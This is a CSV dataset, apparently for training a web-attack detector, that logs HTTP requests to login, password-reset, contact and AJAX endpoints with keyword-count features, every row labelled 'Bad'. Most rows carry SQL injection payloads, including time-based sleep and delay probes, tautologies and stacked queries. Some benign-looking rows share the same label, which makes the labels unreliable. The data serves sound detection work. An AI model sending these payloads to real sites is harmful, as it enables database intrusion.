method,path,body,single_q,double_q,dashes,braces,spaces,at_sign,braces2,sleep,drop,uid,select,waitfor,delay,system,union,group by,order by,version,benchmark,INJ,ECT,xxx,admin,type
POST,/login,password=1%20waitfor%20delay%20'0:0:3'%20--%20&username=admin,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,Bad
POST,/forgotpw,<forgot><username>1&Agrave;&sect;&Agrave;&cent;</username></forgot>,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=%5c,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,ve42wZxt');select pg_sleep(6); --,1,0,1,1,3,0,2,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%5c&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=OmicVsOv';%20waitfor%20delay%20'0:0:6'%20--%20&username=admin,3,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,Bad
POST,/login,password=g00dPa%24%24w0rD&username=%40%40gLqSk,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=cELBFzyL,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>@@HgvDC</username></forgot>,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=1%00%c0%a7%c0%a2&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,HDruxh0k'));select pg_sleep(6); --,1,0,1,1,3,0,3,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=JyI%3d,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>JyI=</username></forgot>,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=PeIFgUnS';select%20pg_sleep(6);%20--%20&username=admin,1,0,1,1,3,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,Bad
GET,/,,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=%40%40EYJDW,,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1%20OR%202%2b784-784-1%3d0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>&iquest;&apos;&iquest;&quot;</username></forgot>,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1%20OR%202%2b497-497-1%3d0%2b0%2b0%2b1,,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=%bf'%bf%22,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%40%40zx3JL&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=stsysrGc');select%20pg_sleep(9);%20--%20&username=admin,1,0,1,1,3,0,2,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,Bad
GET,/ajax/popular?offset=JyI%3d,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=5,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/f69bmkED';select%20pg_sleep(9);%20--%20,,1,0,1,1,3,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>&eth;&apos;&apos;&eth;&quot;&quot;</username></forgot>,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=JyI%3d&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=%f0''%f0%22%22,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=yDkIHdgq'));select%20pg_sleep(9);%20--%20&username=admin,1,0,1,1,3,0,3,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,Bad
GET,/ajax/popular?offset=%bf'%bf%22,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1'%20OR%202%2b525-525-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/35hWy4Eo');select%20pg_sleep(9);%20--%20,,1,0,1,1,3,0,2,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=(select%20convert(int%2cCHAR(65))),0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=admin,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,Bad
POST,/forgotpw,<forgot><username>EVlUDzbd</username></forgot>,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,"<forgot><username>(select convert(int,CHAR(65)))</username></forgot>",0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/tgj0vtP4'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,0,3,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=so5rMsSV,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1'%20OR%202%2b130-130-1%3d0%2b0%2b0%2b1%20or%20'D0BVA48o'%3d',,4,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=%f0''%f0%22%22,,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%bf'%bf%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>e&apos; AND 2*3*8=6*8 AND &apos;Wgrf&apos;=&apos;Wgrf</username></forgot>,0,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%f0''%f0%22%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1%22%20OR%202%2b510-510-1%3d0%2b0%2b0%2b1%20--%20,,0,1,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1%20OR%202%2b69-69-1%3d0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=1'%22,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>e&quot; AND 2*3*8=6*8 AND &quot;GL14&quot;=&quot;GL14</username></forgot>,0,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=(select%20convert(int%2cCHAR(65)))&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,,2,2,0,14,0,0,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=inVBbIOs,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=%5c,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1%20OR%202%2b476-476-1%3d0%2b0%2b0%2b1,,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>e%&apos; AND 2*3*8=6*8 AND &apos;3SSj&apos;!=&apos;3SSj%</username></forgot>,0,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1'%20OR%202%2b223-223-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,,2,2,0,15,0,0,15,3,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=3137%2520Laguna%2520Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=-1%20OR%202%2b995-995-1%3d0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1;%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=-1%20OR%202%2b753-753-1%3d0%2b0%2b0%2b1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=1'%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,"<forgot><username>if(now()=sysdate(),sleep(3),0)/*&apos;XOR(if(now()=sysdate(),sleep(3),0))OR&apos;&quot;XOR(if(now()=sysdate(),sleep(3),0))OR&quot;*/</username></forgot>",0,0,0,14,0,0,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1'%20OR%202%2b187-187-1%3d0%2b0%2b0%2b1%20or%20'cn5EHTFx'%3d',,4,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=%40%40XbU8g,,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1);%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>(select(0)from(select(sleep(6)))v)/*&apos;+(select(0)from(select(sleep(6)))v)+&apos;&quot;+(select(0)from(select(sleep(6)))v)+&quot;*/</username></forgot>,0,0,0,15,0,0,15,3,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%5c&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=-1'%20OR%202%2b769-769-1%3d0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=JyI%3d,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=OqRQapeB';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1%22%20OR%202%2b177-177-1%3d0%2b0%2b0%2b1%20--%20,,0,1,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>1 waitfor delay &apos;0:0:6&apos; -- </username></forgot>,0,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=%bf'%bf%22,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=1%00%c0%a7%c0%a2&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,0,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1;select%20pg_sleep(6);%20--%20,,0,0,1,1,3,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=-1'%20OR%202%2b694-694-1%3d0%2b0%2b0%2b1%20or%20'xnqRWndW'%3d',4,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>Ziin6e3N&apos;; waitfor delay &apos;0:0:9&apos; -- </username></forgot>,0,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=-1%22%20OR%202%2b174-174-1%3d0%2b0%2b0%2b1%20--%20,0,1,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%40%401bZON&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=%f0''%f0%22%22,,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/,,2,2,0,15,0,0,15,3,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1);select%20pg_sleep(6);%20--%20,,0,0,1,1,3,0,2,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=JyI%3d&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>rjDzQonD&apos;;select pg_sleep(9); -- </username></forgot>,0,0,1,1,3,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,2,2,0,14,0,0,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1;%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=-1));select%20pg_sleep(9);%20--%20,,0,0,1,1,3,0,3,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>2pckmZ9J&apos;);select pg_sleep(3); -- </username></forgot>,0,0,1,1,3,0,2,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%bf'%bf%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,2,2,0,15,0,0,15,3,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1);%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=65Namo09';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,6,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%f0''%f0%22%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/forgotpw,<forgot><username>1r9H1dkb&apos;));select pg_sleep(6); -- </username></forgot>,0,0,1,1,3,0,3,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=HudRPBiF');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,0,2,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/popular?offset=u41i0KZL'));select%20pg_sleep(6);%20--%20,,1,0,1,1,3,0,3,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=(select%20convert(int%2cCHAR(65)))&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=FEXbhJxl';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=GqFKZRHw';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,6,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1;select%20pg_sleep(9);%20--%20,,0,0,1,1,3,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=ZC5FGeqS';select%20pg_sleep(3);%20--%20,1,0,1,1,3,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=3137%2520Laguna%2520Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=product,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=1'%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=product,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=jJgpoF9r');select%20pg_sleep(3);%20--%20,1,0,1,1,3,0,2,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1);select%20pg_sleep(3);%20--%20,,0,0,1,1,3,0,2,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/login,password=g00dPa%24%24w0rD&username=sjaT3DY3'));select%20pg_sleep(6);%20--%20,1,0,1,1,3,0,3,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/contact,address=%5c&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=product,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/ajax/latest?offset=-1));select%20pg_sleep(6);%20--%20,,0,0,1,1,3,0,3,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,Bad
